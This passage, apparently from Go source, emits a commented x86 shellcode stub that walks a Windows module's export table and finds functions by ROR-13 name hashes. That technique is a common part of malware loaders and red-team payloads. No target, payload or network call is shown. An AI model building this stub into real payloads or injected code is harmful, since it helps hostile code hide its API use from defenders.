		0x53, 0x56, 0x57, // push ebx, esi, edi
		0x8B, 0x5D, 0x08, // mov ebx, [ebp+0x08] (moduleBase)
		0x8B, 0x43, 0x3C, // mov eax, [ebx+0x3C] (e_lfanew)
		0x8B, 0x44, 0x18, 0x78, // mov eax, [eax+ebx+0x78] (ExportDir RVA)
		0x01, 0xD8, // add eax, ebx
		0x8B, 0x48, 0x18, // mov ecx, [eax+0x18] (NumberOfNames)
		0x8B, 0x50, 0x20, // mov edx, [eax+0x20] (AddressOfNames RVA)
		0x01, 0xDA, // add edx, ebx
		// name_loop:
		0x49,             // dec ecx
		0x8B, 0x34, 0x8A, // mov esi, [edx+ecx*4]
		0x01, 0xDE, // add esi, ebx
		0x31, 0xFF, // xor edi, edi (hash = 0)
		// hash_loop:
		0x31, 0xC0, // xor eax, eax
		0xAC,       // lodsb
		0x84, 0xC0, // test al, al
		0x74, 0x07, // jz hash_done
		0xC1, 0xCF, 0x0D, // ror edi, 13
		0x01, 0xC7, // add edi, eax
		0xEB, 0xF3, // jmp hash_loop
		// hash_done:
		0x3B, 0x7D, 0x0C, // cmp edi, [ebp+0x0C] (targetHash)
		0x75, 0xE5, // jne name_loop
		// matched:
		0x8B, 0x43, 0x3C, // mov eax, [ebx+0x3C]
		0x8B, 0x44, 0x18, 0x78, // mov eax, [eax+ebx+0x78]
		0x8B, 0x50, 0x24, // mov edx, [eax+0x24] (AddressOfNameOrdinals)
		0x01, 0xDA, // add edx, ebx
		0x0F, 0xB7, 0x0C, 0x4A, // movzx ecx, word ptr [edx+ecx*2]
		0x8B, 0x50, 0x1C, // mov edx, [eax+0x1C] (AddressOfFunctions)
		0x01, 0xDA, // add edx, ebx
		0x8B, 0x04, 0x8A, // mov eax, [edx+ecx*4]
		0x01, 0xD8, // add eax, ebx
		0x5F, 0x5E, 0x5B, // pop edi, esi, ebx
		0x5D,             // pop ebp
		0xC2, 0x08, 0x00, // ret 8
	})

	return buf.Bytes()
}
